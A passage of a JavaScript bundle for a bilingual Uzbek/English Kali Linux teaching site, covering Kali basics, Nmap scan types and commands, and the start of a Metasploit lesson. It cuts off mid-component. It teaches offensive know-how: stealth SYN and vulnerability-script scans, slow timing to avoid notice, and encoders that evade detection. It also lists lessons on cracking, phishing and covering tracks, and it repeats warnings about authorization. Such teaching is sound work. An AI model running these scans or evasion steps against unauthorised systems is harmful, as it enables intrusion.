"use strict";
// ─────────────────────────────────────────────────────────────
// KALI LINUX ACADEMY — Main Bundle
// ─────────────────────────────────────────────────────────────
const {useState,useEffect,useRef,useCallback,createContext,useContext}=React;

// ── Constants ────────────────────────────────────────────────
const PROG_KEY="ka_progress",ROUTE_KEY="ka_route",THEME_KEY="ka_theme",LANG_KEY="ka_lang";
const AI_KEYS_STORE="wa_ai_keys",AI_ACTIVE_STORE="wa_ai_active_id";

// ── AI helpers (shares keys with Windows/Network Academy) ─────
function loadAiKeys(){try{const s=localStorage.getItem(AI_KEYS_STORE);if(s)return JSON.parse(s);}catch{}return[];}
function getActiveAiKey(){const k=loadAiKeys();if(!k.length)return null;const id=localStorage.getItem(AI_ACTIVE_STORE)||"";return k.find(x=>x.id===id)||k[0];}
async function callAI(prompt){
  const px=localStorage.getItem("wa_ai_proxy")||"";
  if(px){const r=await fetch(px,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({provider:"",prompt})});const d=await r.json();if(!r.ok)throw new Error(d.error||"Proxy error");return d.text;}
  const a=getActiveAiKey();if(!a||!a.key)throw new Error("no_key");
  const {provider:pv,key}=a;
  if(pv==="groq"){const r=await fetch("https://api.groq.com/openai/v1/chat/completions",{method:"POST",headers:{"Content-Type":"application/json","Authorization":"Bearer "+key},body:JSON.stringify({model:"llama-3.3-70b-versatile",messages:[{role:"user",content:prompt}],max_tokens:600,temperature:0.3})});const d=await r.json();if(!r.ok)throw new Error(d.error?.message||"Groq error");return d.choices[0].message.content;}
  if(pv==="openai"){const r=await fetch("https://api.openai.com/v1/chat/completions",{method:"POST",headers:{"Content-Type":"application/json","Authorization":"Bearer "+key},body:JSON.stringify({model:"gpt-4o-mini",messages:[{role:"user",content:prompt}],max_tokens:600})});const d=await r.json();if(!r.ok)throw new Error(d.error?.message||"OpenAI error");return d.choices[0].message.content;}
  if(pv==="anthropic"){const r=await fetch("https://api.anthropic.com/v1/messages",{method:"POST",headers:{"Content-Type":"application/json","x-api-key":key,"anthropic-version":"2023-06-01","anthropic-dangerous-direct-browser-access":"true"},body:JSON.stringify({model:"claude-haiku-4-5-20251001",max_tokens:600,messages:[{role:"user",content:prompt}]})});const d=await r.json();if(!r.ok)throw new Error(d.error?.message||"Anthropic error");return d.content[0].text;}
  if(pv==="gemini"){const r=await fetch(`https://generativelanguage.googleapis.com/v1/models/gemini-2.0-flash-lite:generateContent?key=${key}`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({contents:[{parts:[{text:prompt}]}],generationConfig:{maxOutputTokens:600,temperature:0.3}})});const d=await r.json();if(!r.ok)throw new Error(d.error?.message||"Gemini error");return d.candidates[0].content.parts[0].text;}
  throw new Error("no_key");
}

// ── Progress ─────────────────────────────────────────────────
function todayStr(){return new Date().toISOString().slice(0,10);}
function loadProgress(){try{const s=localStorage.getItem(PROG_KEY);if(s)return{...defaultProgress(),...JSON.parse(s)};}catch{}return defaultProgress();}
function defaultProgress(){return{xp:0,level:1,completedLessons:[],name:"Student",lastLogin:null,streak:0};}
function saveProgress(p){try{localStorage.setItem(PROG_KEY,JSON.stringify(p));}catch{}}
function xpToLevel(xp){return Math.max(1,Math.floor(xp/500)+1);}

// ── Language ─────────────────────────────────────────────────
const LangCtx=createContext("uz");
function useLang(){return useContext(LangCtx);}
function t(lang,uz,en){return lang==="en"?en:uz;}

// ── Icons (SVG paths) ─────────────────────────────────────────
const ICONS={
  shield:"M12 2L4 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-8-3z",
  network:"M4 6h16v2H4zm0 5h16v2H4zm0 5h16v2H4z",
  terminal:"M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V8h16v10zM6 10l1.4-1.4L11 12.2l-3.6 3.6L6 14.4l2.2-2.2L6 10zm6 4.5h5V16h-5z",
  target:"M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm0-14c-3.31 0-6 2.69-6 6s2.69 6 6 6 6-2.69 6-6-2.69-6-6-6zm0 10c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4z",
  bug:"M20 8h-2.81c-.45-.78-1.07-1.45-1.82-1.96L17 4.41 15.59 3l-2.17 2.17C12.96 5.06 12.49 5 12 5c-.49 0-.96.06-1.41.17L8.41 3 7 4.41l1.62 1.63C7.88 6.55 7.26 7.22 6.81 8H4v2h2.09c-.05.33-.09.66-.09 1v1H4v2h2v1c0 .34.04.67.09 1H4v2h2.81c1.04 1.79 2.97 3 5.19 3s4.15-1.21 5.19-3H20v-2h-2.09c.05-.33.09-.66.09-1v-1h2v-2h-2v-1c0-.34-.04-.67-.09-1H20V8zm-6 8h-4v-2h4v2zm0-4h-4v-2h4v2z",
  lock:"M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z",
  star:"M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z",
  code:"M9.4 16.6L4.8 12l4.6-4.6L8 6l-6 6 6 6 1.4-1.4zm5.2 0l4.6-4.6-4.6-4.6L16 6l6 6-6 6-1.4-1.4z",
  cpu:"M9 3H7c-2.2 0-4 1.8-4 4v2h2V7c0-1.1.9-2 2-2h2V3zm8 0h-2v2h2c1.1 0 2 .9 2 2v2h2V7c0-2.2-1.8-4-4-4zM3 15v2c0 2.2 1.8 4 4 4h2v-2H7c-1.1 0-2-.9-2-2v-2H3zm18 0v2c0 1.1-.9 2-2 2h-2v2h2c2.2 0 4-1.8 4-4v-2h-2zM7 7h10v10H7z",
  layers:"M11.99 18.54l-7.37-5.73L3 14.07l9 7 9-7-1.63-1.27-7.38 5.74zM12 16l7.36-5.73L21 9l-9-7-9 7 1.63 1.27L12 16z",
  x:"M18.3 5.71a1 1 0 0 0-1.41 0L12 10.59 7.11 5.7A1 1 0 0 0 5.7 7.11L10.59 12 5.7 16.89a1 1 0 0 0 1.41 1.41L12 13.41l4.89 4.89a1 1 0 0 0 1.41-1.41L13.41 12l4.89-4.89a1 1 0 0 0 0-1.4z",
  send:"M2.01 21L23 12 2.01 3 2 10l15 2-15 2z",
  spark:"M13 2L3 14h9l-1 8 10-12h-9l1-8z",
  key:"M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z",
  check:"M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z",
  arrow:"M8 5v14l11-7z",
  settings:"M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58a.49.49 0 0 0 .12-.61l-1.92-3.32a.488.488 0 0 0-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54a.484.484 0 0 0-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58a.49.49 0 0 0-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.57 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z",
  database:"M12 3C7.58 3 4 4.79 4 7v10c0 2.21 3.58 4 8 4s8-1.79 8-4V7c0-2.21-3.58-4-8-4zm0 2c3.87 0 6 1.5 6 2s-2.13 2-6 2-6-1.5-6-2 2.13-2 6-2zm0 14c-3.87 0-6-1.5-6-2v-1.5c1.26.83 3.5 1.5 6 1.5s4.74-.67 6-1.5V17c0 .5-2.13 2-6 2z",
  wifi:"M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3a4.237 4.237 0 0 0-6 0zm-4-4l2 2a7.074 7.074 0 0 1 10 0l2-2C15.14 9.14 8.87 9.14 5 13z",
};
function Icon({name,size=16,style={}}){const d=ICONS[name]||ICONS.star;return React.createElement("svg",{width:size,height:size,viewBox:"0 0 24 24",fill:"currentColor",style:{flexShrink:0,...style}},React.createElement("path",{d}));}

// ── Core UI components ─────────────────────────────────────────
function H2({num,children}){return React.createElement("h2",{style:{fontFamily:"var(--font-display)",fontSize:18,fontWeight:700,margin:"28px 0 10px",color:"var(--text-0)",display:"flex",alignItems:"center",gap:10}},num&&React.createElement("span",{style:{fontFamily:"var(--font-mono)",fontSize:11,color:"var(--accent)",fontWeight:900}},num),children);}
function P({children,style={}}){return React.createElement("p",{style:{fontSize:13.5,lineHeight:1.75,color:"var(--text-1)",margin:"0 0 14px",...style}},children);}
function Term({children}){return React.createElement("code",{style:{background:"rgba(168,85,247,0.12)",border:"1px solid var(--accent-border)",borderRadius:6,padding:"1px 6px",fontFamily:"var(--font-mono)",fontSize:12,color:"var(--accent)"}},children);}
function Terminal({children}){return React.createElement("pre",{style:{background:"rgba(0,0,0,0.5)",border:"1px solid var(--border)",borderRadius:10,padding:"14px 16px",fontFamily:"var(--font-mono)",fontSize:12,color:"#7effb2",overflowX:"auto",margin:"12px 0",lineHeight:1.65}},children);}
function InfoBox({children,color="var(--accent)"}){return React.createElement("div",{style:{background:`${color}0d`,border:`1px solid ${color}33`,borderRadius:12,padding:"12px 16px",margin:"12px 0",fontSize:12.5,color:"var(--text-1)",lineHeight:1.7}},children);}

// ── Quiz ──────────────────────────────────────────────────────
function Quiz({q,opts,correct,exp}){
  const lang=useLang();
  const [sel,setSel]=useState(null);
  const tx=x=>x==null?"":typeof x==="string"?x:t(lang,x.uz,x.en);
  return React.createElement("div",{style:{margin:"18px 0",padding:"16px 18px",background:"var(--surface)",border:"1px solid var(--accent-border)",borderRadius:14}},
    React.createElement("div",{style:{display:"flex",alignItems:"center",gap:8,marginBottom:12}},
      React.createElement(Icon,{name:"spark",size:14,style:{color:"var(--accent)"}}),
      React.createElement("span",{style:{fontFamily:"var(--font-mono)",fontSize:10,color:"var(--accent)",fontWeight:700,letterSpacing:1}},t(lang,"BILIMNI TEKSHIRING","QUICK QUIZ"))
    ),
    React.createElement("div",{style:{fontSize:13.5,fontWeight:600,color:"var(--text-0)",marginBottom:12,lineHeight:1.6}},tx(q)),
    opts.map((o,i)=>{
      const chosen=sel===i,isCorrect=i===correct;
      const bg=sel==null?"var(--bg-2)":isCorrect?"rgba(0,255,136,0.12)":chosen?"rgba(255,58,94,0.12)":"var(--bg-2)";
      const bd=sel==null?"var(--border)":isCorrect?"#00ff88":chosen?"var(--c-attack)":"var(--border)";
      return React.createElement("button",{key:i,onClick:()=>sel==null&&setSel(i),disabled:sel!=null,
        style:{display:"flex",alignItems:"center",gap:10,width:"100%",boxSizing:"border-box",textAlign:"left",marginBottom:7,padding:"10px 12px",borderRadius:9,cursor:sel==null?"pointer":"default",appearance:"none",border:`1.5px solid ${bd}`,background:bg,color:"var(--text-0)",fontSize:12.5}},
        React.createElement("span",{style:{fontFamily:"var(--font-mono)",fontSize:11,color:"var(--text-3)",fontWeight:700}},String.fromCharCode(65+i)),
        React.createElement("span",{style:{flex:1}},tx(o)),
        sel!=null&&isCorrect&&React.createElement(Icon,{name:"check",size:14,style:{color:"#00ff88"}}),
        sel!=null&&chosen&&!isCorrect&&React.createElement(Icon,{name:"x",size:14,style:{color:"var(--c-attack)"}})
      );
    }),
    sel!=null&&React.createElement("div",{style:{marginTop:10,padding:"10px 12px",borderRadius:9,background:sel===correct?"rgba(0,255,136,0.08)":"rgba(255,58,94,0.08)",border:`1px solid ${sel===correct?"rgba(0,255,136,0.3)":"rgba(255,58,94,0.3)"}`,fontSize:12,color:"var(--text-1)",lineHeight:1.6}},
      React.createElement("strong",{style:{color:sel===correct?"#00ff88":"var(--c-attack)"}},sel===correct?t(lang,"To'g'ri! ","Correct! "):t(lang,"Noto'g'ri. ","Incorrect. ")),
      tx(exp))
  );
}

// ── Lessons data ──────────────────────────────────────────────
const LESSONS={
  1:{num:"L01",sec:1,uz:"Kali Linux nima?",en:"What is Kali Linux?",sub:"Kali'ga kirish, tarix va use-case'lar"},
  2:{num:"L02",sec:1,uz:"Kali'ni O'rnatish",en:"Installing Kali",sub:"VirtualBox, VMware, WSL va live USB"},
  3:{num:"L03",sec:1,uz:"Buyruq Qatori Asoslari",en:"Command Line Basics",sub:"ls, cd, pwd, cat, grep, pipe va redirect"},
  4:{num:"L04",sec:1,uz:"Linux Fayl Tizimi",en:"Linux File System",sub:"FHS: /etc, /var, /home, /usr, /root"},
  5:{num:"L05",sec:1,uz:"Foydalanuvchilar & Ruxsatlar",en:"Users & Permissions",sub:"chmod, chown, sudo, /etc/passwd"},
  6:{num:"L06",sec:1,uz:"Paketlarni Boshqarish (apt)",en:"Package Management (apt)",sub:"apt update, install, dpkg, repolar"},
  7:{num:"L07",sec:1,uz:"Bash Skripting",en:"Bash Scripting",sub:"O'zgaruvchilar, tsikllar, shartlar, funksiyalar"},
  8:{num:"L08",sec:1,uz:"Tarmoq Asoslari",en:"Networking Basics",sub:"ip, ifconfig, ping, netstat, ss"},
  9:{num:"L09",sec:1,uz:"Xizmatlar (Services)",en:"Services",sub:"systemctl, SSH, Apache, PostgreSQL"},
  10:{num:"L10",sec:1,uz:"Kali Vositalari Sharhi",en:"Kali Tools Overview",sub:"Menyu bo'yicha 600+ vosita toifasi"},
  11:{num:"L11",sec:2,uz:"Nmap",en:"Nmap",sub:"Port skanerlash va xizmat aniqlash"},
  12:{num:"L12",sec:2,uz:"Netdiscover",en:"Netdiscover",sub:"ARP orqali tirik xostlarni topish"},
  13:{num:"L13",sec:2,uz:"Masscan",en:"Masscan",sub:"Ultra-tez internet miqyosidagi skan"},
  14:{num:"L14",sec:2,uz:"DNS Enumeratsiya",en:"DNS Enumeration",sub:"dnsenum, dnsrecon, zona transfer"},
  15:{num:"L15",sec:2,uz:"theHarvester",en:"theHarvester",sub:"OSINT: email, subdomen, xostlar"},
  16:{num:"L16",sec:2,uz:"Nikto",en:"Nikto",sub:"Veb-server zaifliklari skaneri"},
  17:{num:"L17",sec:2,uz:"WhatWeb",en:"WhatWeb",sub:"Veb-texnologiyalarni aniqlash"},
  18:{num:"L18",sec:2,uz:"enum4linux",en:"enum4linux",sub:"Windows/Samba enumeratsiya"},
  19:{num:"L19",sec:2,uz:"SMB Enumeratsiya",en:"SMB Enumeration",sub:"smbclient, smbmap, share'lar"},
  20:{num:"L20",sec:2,uz:"Wireshark",en:"Wireshark",sub:"Trafik tahlili va paket ushlash"},
  21:{num:"L21",sec:3,uz:"Metasploit Framework",en:"Metasploit Framework",sub:"msfconsole, modullar, Meterpreter"},
  22:{num:"L22",sec:3,uz:"msfvenom",en:"msfvenom",sub:"Payload generatsiya va kodlash"},
  23:{num:"L23",sec:3,uz:"searchsploit & Exploit-DB",en:"searchsploit & Exploit-DB",sub:"Ma'lum ekspluatlarni topish"},
  24:{num:"L24",sec:3,uz:"Hydra",en:"Hydra",sub:"Onlayn parol brute-force"},
  25:{num:"L25",sec:3,uz:"John the Ripper",en:"John the Ripper",sub:"Parol xeshlarini buzish (CPU)"},
  26:{num:"L26",sec:3,uz:"Hashcat",en:"Hashcat",sub:"GPU bilan xesh buzish"},
  27:{num:"L27",sec:3,uz:"Burp Suite",en:"Burp Suite",sub:"Veb-ilova proxy va tahlil"},
  28:{num:"L28",sec:3,uz:"Social Engineering (SET)",en:"Social Engineering (SET)",sub:"Fishing va inson omili hujumlari"},
  29:{num:"L29",sec:3,uz:"Imtiyozlarni Oshirish",en:"Privilege Escalation",sub:"SUID, sudo, kernel exploit asoslari"},
  30:{num:"L30",sec:3,uz:"Izlarni Yashirish & Hisobot",en:"Covering Tracks & Reporting",sub:"Loglar, tozalash va pentest hisoboti"},
};

const SECTIONS={
  1:{num:"01",uz:"Kali Asoslari",en:"Kali Basics",color:"var(--c-system)",icon:"terminal",count:10,
     descUz:"Kali'ni o'rnatish, Linux buyruq qatori, fayl tizimi, ruxsatlar, apt va bash skriptlashni o'rganing.",
     descEn:"Learn Kali installation, the Linux command line, file system, permissions, apt and bash scripting."},
  2:{num:"02",uz:"Ma'lumot To'plash & Skanerlash",en:"Recon & Scanning",color:"var(--c-defense)",icon:"target",count:10,
     descUz:"Nmap, Masscan, DNS enumeratsiya, theHarvester, Nikto va SMB skanerlash bilan nishon haqida ma'lumot to'plang.",
     descEn:"Gather intel on targets with Nmap, Masscan, DNS enumeration, theHarvester, Nikto and SMB scanning."},
  3:{num:"03",uz:"Ekspluatatsiya & Post",en:"Exploitation & Post",color:"var(--c-attack)",icon:"bug",count:10,
     descUz:"Metasploit, msfvenom, Hydra, John, Hashcat, Burp Suite va imtiyozlarni oshirish bilan ekspluatatsiyani o'rganing.",
     descEn:"Master exploitation with Metasploit, msfvenom, Hydra, John, Hashcat, Burp Suite and privilege escalation."},
};

// ── Lesson content: L01 What is Kali Linux ───────────────────
function LessonL01(){
  const lang=useLang();
  const distros=[
    {name:"Kali Linux",base:"Debian",uz:"Pentest va xavfsizlik auditi uchun. 600+ oldindan o'rnatilgan vosita.",en:"For pentesting & security auditing. 600+ pre-installed tools.",color:"#a855f7"},
    {name:"Parrot OS",base:"Debian",uz:"Pentest + maxfiylik va anonimlik vositalari. Yengilroq tizim.",en:"Pentest + privacy/anonymity tools. Lighter footprint.",color:"#00d4ff"},
    {name:"BlackArch",base:"Arch",uz:"2800+ vosita, tajribali foydalanuvchilar uchun.",en:"2800+ tools, aimed at advanced users.",color:"#ff3a5e"},
    {name:"Ubuntu",base:"Debian",uz:"Umumiy maqsadli ish stoli/server OS — pentest uchun mo'ljallanmagan.",en:"General-purpose desktop/server OS — not built for pentesting.",color:"#ff9145"},
  ];
  const uses=[
    {icon:"target",uz:"Penetration Testing — tizim zaifliklarini ruxsat bilan sinash",en:"Penetration Testing — probing system weaknesses with authorization"},
    {icon:"wifi",uz:"Simsiz tarmoq auditi — WiFi xavfsizligini baholash",en:"Wireless auditing — assessing WiFi security"},
    {icon:"database",uz:"Digital Forensics — raqamli dalillarni tahlil qilish",en:"Digital Forensics — analyzing digital evidence"},
    {icon:"code",uz:"Reverse Engineering — dasturlarni teskari tahlil qilish",en:"Reverse Engineering — dissecting binaries and malware"},
  ];
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"Kali Linux nima?","What is Kali Linux?")),
    React.createElement(P,null,t(lang,
      "Kali Linux — Debian asosidagi, bepul va ochiq kodli operatsion tizim bo'lib, maxsus penetration testing (kirib borish sinovi) va xavfsizlik auditi uchun mo'ljallangan. U Offensive Security kompaniyasi tomonidan ishlab chiqilgan va mashhur BackTrack Linux ning vorisi hisoblanadi. Kali 600 dan ortiq xavfsizlik vositasi bilan oldindan jihozlangan.",
      "Kali Linux is a free, open-source, Debian-based operating system purpose-built for penetration testing and security auditing. Developed by Offensive Security, it is the successor to the well-known BackTrack Linux and ships with 600+ pre-installed security tools."
    )),
    React.createElement(InfoBox,{color:"var(--accent)"},
      React.createElement("strong",null,t(lang,"Muhim faktlar: ","Key facts: ")),
      t(lang,
        "Kali \"rolling release\" modelida ishlaydi — tizim doimiy yangilanib turadi. U jonli (live) USB, virtual mashina, WSL yoki ARM qurilmalarida ishlashi mumkin. Zamonaviy Kali oddiy foydalanuvchi (kali) hisobi bilan keladi, root emas.",
        "Kali follows a rolling-release model — it updates continuously. It can run from a live USB, a virtual machine, WSL, or ARM devices. Modern Kali defaults to a non-root user (kali), not root."
      )
    ),
    React.createElement(H2,{num:"§2"},t(lang,"Kali vs boshqa distributivlar","Kali vs other distros")),
    distros.map((dctx,i)=>React.createElement("div",{key:i,style:{display:"flex",gap:12,marginBottom:8,padding:"12px 14px",background:"var(--surface)",border:`1px solid ${dctx.color}33`,borderRadius:10,alignItems:"flex-start"}},
      React.createElement("div",{style:{width:10,height:10,borderRadius:"50%",background:dctx.color,marginTop:4,flexShrink:0,boxShadow:`0 0 10px ${dctx.color}`}}),
      React.createElement("div",{style:{flex:1}},
        React.createElement("div",{style:{fontWeight:700,fontSize:13,color:"var(--text-0)",marginBottom:2}},
          dctx.name,React.createElement("span",{style:{fontFamily:"var(--font-mono)",fontSize:10,color:dctx.color,marginLeft:8,fontWeight:600}},dctx.base)),
        React.createElement("div",{style:{fontSize:12,color:"var(--text-2)",lineHeight:1.55}},t(lang,dctx.uz,dctx.en))
      )
    )),
    React.createElement(H2,{num:"§3"},t(lang,"Nima uchun ishlatiladi?","What is it used for?")),
    uses.map((u,i)=>React.createElement("div",{key:i,style:{display:"flex",alignItems:"center",gap:12,marginBottom:7,padding:"10px 14px",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10}},
      React.createElement("div",{style:{width:32,height:32,borderRadius:8,background:"var(--accent-soft)",border:"1px solid var(--accent-border)",display:"flex",alignItems:"center",justifyContent:"center",flexShrink:0}},
        React.createElement(Icon,{name:u.icon,size:16,style:{color:"var(--accent)"}})),
      React.createElement("div",{style:{fontSize:12.5,color:"var(--text-1)",lineHeight:1.55}},t(lang,u.uz,u.en))
    )),
    React.createElement(H2,{num:"§4"},t(lang,"Birinchi buyruqlar","First commands")),
    React.createElement(P,null,t(lang,
      "Kali'ni ishga tushirgach, terminal ochib tizimni tekshiring va yangilang. Quyidagi buyruqlar har bir Kali foydalanuvchisi bilishi shart bo'lgan asosiy amallardir:",
      "After booting Kali, open a terminal to inspect and update the system. These commands are the essentials every Kali user should know:"
    )),
    React.createElement(Terminal,null,
`# Kali versiyasi va release ma'lumoti
cat /etc/os-release

# Kernel va arxitektura
uname -a

# Joriy foydalanuvchi kim?
whoami

# Kali'ni to'liq yangilash (rolling release)
sudo apt update && sudo apt full-upgrade -y

# O'rnatilgan xavfsizlik vositalarini ko'rish
ls /usr/share/ | grep -iE 'nmap|metasploit|wordlists'`),
    React.createElement(InfoBox,{color:"var(--c-warn)"},
      React.createElement("strong",null,"⚠ "),
      t(lang,
        "Kali vositalari faqat siz egasi bo'lgan yoki yozma ruxsat olingan tizimlarda ishlatilishi kerak. Ruxsatsiz skanerlash yoki hujum ko'p mamlakatlarda jinoyat hisoblanadi.",
        "Kali tools must only be used on systems you own or have written permission to test. Unauthorized scanning or attacks are a crime in most jurisdictions."
      )
    ),
    React.createElement(Quiz,{
      q:{uz:"Kali Linux qaysi distributiv asosida qurilgan?",en:"Which distribution is Kali Linux based on?"},
      opts:["Arch Linux","Debian","Fedora","Gentoo"],
      correct:1,
      exp:{uz:"Kali Linux Debian asosida qurilgan va Offensive Security tomonidan ishlab chiqilgan.",en:"Kali Linux is built on Debian and developed by Offensive Security."}
    })
  );
}

// ── Lesson L11: Nmap ──────────────────────────────────────────
function LessonL11(){
  const lang=useLang();
  const scans=[
    {flag:"-sS",name:"TCP SYN (Stealth)",uz:"Yarim ochiq skan — to'liq ulanish o'rnatmaydi. Tez va nisbatan yashirin. root talab qiladi.",en:"Half-open scan — never completes the handshake. Fast and relatively stealthy. Needs root."},
    {flag:"-sT",name:"TCP Connect",uz:"To'liq TCP ulanishi o'rnatiladi. root shart emas, lekin loglarda aniq ko'rinadi.",en:"Completes a full TCP connection. No root needed, but clearly appears in logs."},
    {flag:"-sU",name:"UDP Scan",uz:"UDP portlarini skanerlaydi. Sekin, lekin DNS/SNMP/DHCP kabi xizmatlar uchun muhim.",en:"Scans UDP ports. Slow, but vital for services like DNS, SNMP and DHCP."},
    {flag:"-sV",name:"Version Detection",uz:"Ochiq portdagi xizmat va uning aniq versiyasini aniqlaydi.",en:"Identifies the service and its exact version behind an open port."},
    {flag:"-O",name:"OS Detection",uz:"TCP/IP steka xatti-harakati orqali operatsion tizimni taxmin qiladi.",en:"Fingerprints the operating system via TCP/IP stack behavior."},
    {flag:"-sn",name:"Ping Scan",uz:"Faqat tirik xostlarni topadi — portlarni skanerlamaydi (host discovery).",en:"Host discovery only — finds live hosts without scanning ports."},
    {flag:"-A",name:"Aggressive",uz:"Bir buyruqda: -sV, -O, default NSE skriptlar va traceroute.",en:"All-in-one: -sV, -O, default NSE scripts and traceroute."},
  ];
  return React.createElement("section",null,
    React.createElement(H2,{num:"§1"},t(lang,"Nmap nima?","What is Nmap?")),
    React.createElement(P,null,t(lang,
      "Nmap (Network Mapper) — tarmoqni kashf qilish va xavfsizlik auditi uchun eng mashhur ochiq kodli vosita. U qaysi xostlar tirik ekanini, qaysi portlar ochiqligini, ular ortida qanday xizmat va versiyalar ishlayotganini hamda hatto operatsion tizimni ham aniqlay oladi. Kali'da oldindan o'rnatilgan.",
      "Nmap (Network Mapper) is the most popular open-source tool for network discovery and security auditing. It reveals which hosts are alive, which ports are open, what services and versions run behind them, and can even fingerprint the OS. It comes pre-installed on Kali."
    )),
    React.createElement(H2,{num:"§2"},t(lang,"Skan turlari","Scan types")),
    scans.map((s,i)=>React.createElement("div",{key:i,style:{display:"flex",gap:12,marginBottom:8,padding:"11px 14px",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:10,alignItems:"flex-start"}},
      React.createElement("code",{style:{fontFamily:"var(--font-mono)",fontSize:12,fontWeight:700,color:"var(--accent)",background:"var(--accent-soft)",border:"1px solid var(--accent-border)",borderRadius:6,padding:"2px 8px",flexShrink:0,minWidth:38,textAlign:"center"}},s.flag),
      React.createElement("div",{style:{flex:1}},
        React.createElement("div",{style:{fontWeight:700,fontSize:12.5,color:"var(--text-0)",marginBottom:2}},s.name),
        React.createElement("div",{style:{fontSize:12,color:"var(--text-2)",lineHeight:1.55}},t(lang,s.uz,s.en))
      )
    )),
    React.createElement(H2,{num:"§3"},t(lang,"Haqiqiy buyruqlar","Real commands")),
    React.createElement(Terminal,null,
`# Tezkor skan — eng mashhur 1000 port
nmap 10.10.10.5

# Barcha 65535 TCP portni skanerlash
nmap -p- 10.10.10.5

# SYN stealth skan (root kerak)
sudo nmap -sS 10.10.10.5

# Xizmat versiyalari + OS aniqlash + default skriptlar
sudo nmap -sV -O -sC 10.10.10.5

# Butun quyi tarmoqdagi tirik xostlarni topish
nmap -sn 192.168.1.0/24

# Aniq portlar + agressiv skan
nmap -A -p 22,80,443 10.10.10.5

# NSE skript: ma'lum zaifliklarni tekshirish
nmap --script vuln 10.10.10.5

# Sekin/yashirin timing + barcha formatlarda saqlash
sudo nmap -sS -T2 -oA scan_natija 10.10.10.5`),
    React.createElement(H2,{num:"§4"},t(lang,"Timing va natijalar","Timing & output")),
    React.createElement(P,null,t(lang,
      "Timing shablonlari -T0 (paranoid, juda sekin) dan -T5 (insane, juda tez) gacha skan tezligini boshqaradi. Yashirinlik kerak bo'lganda -T1/-T2, tezlik kerak bo'lganda -T4 ishlatiladi. Natijani -oN (oddiy), -oX (XML), -oG (grep) yoki -oA (barcha formatlar) bilan saqlash mumkin.",
      "Timing templates from -T0 (paranoid, very slow) to -T5 (insane, very fast) control scan speed. Use -T1/-T2 for stealth, -T4 for speed. Save results with -oN (normal), -oX (XML), -oG (grepable) or -oA (all formats at once)."
    )),
    React.createElement(InfoBox,{color:"var(--c-warn)"},
      React.createElement("strong",null,"⚠ "),
      t(lang,"Faqat yozma ruxsat berilgan tizimlarni skanerlang! Ruxsatsiz port skanerlash ko'p mamlakatlarda noqonuniy hisoblanadi.","Only scan systems you have written permission to test! Unauthorized port scanning is illegal in many countries.")
    ),
    React.createElement(Quiz,{
      q:{uz:"Qaysi nmap bayrog'i yashirin SYN (half-open) skanni bajaradi?",en:"Which nmap flag performs a stealth SYN (half-open) scan?"},
      opts:["-sT","-sS","-sU","-sn"],
      correct:1,
      exp:{uz:"-sS SYN skani to'liq ulanishni o'rnatmaydi, shuning uchun tez va nisbatan yashirin. root huquqi kerak.",en:"-sS never completes the TCP handshake, making it fast and relatively stealthy. It requires root."}
    })
  );
}

// ── Lesson L21: Metasploit Framework ─────────────────────────
function LessonL21(){
  const lang=useLang();
  const mods=[
    {name:"exploit",uz:"Muayyan zaiflikdan foydalanib nishonga kirish uchun ishlatiladigan kod.",en:"Code that leverages a specific vulnerability to gain access to a target."},
    {name:"payload",uz:"Ekspluatatsiya muvaffaqiyatli bo'lgach nishonda bajariladigan kod (masalan, Meterpreter).",en:"Code executed on the target after a successful exploit (e.g., Meterpreter)."},
    {name:"auxiliary",uz:"Skanerlash, fuzzing, DoS — payloadsiz yordamchi modullar.",en:"Scanners, fuzzers, DoS — helper modules without a payload."},
    {name:"post",uz:"Kirishdan keyingi ishlar: ma'lumot yig'ish, pivoting, imtiyozlarni oshirish.",en:"Post-exploitation: data gathering, pivoting, privilege escalation."},
    {name:"encoder",uz:"Payloadni imzoga asoslangan aniqlashdan yashirish uchun kodlash.",en:"Encodes payloads to evade signature-based detection."},
  ];
  return React.createElement("section",null,
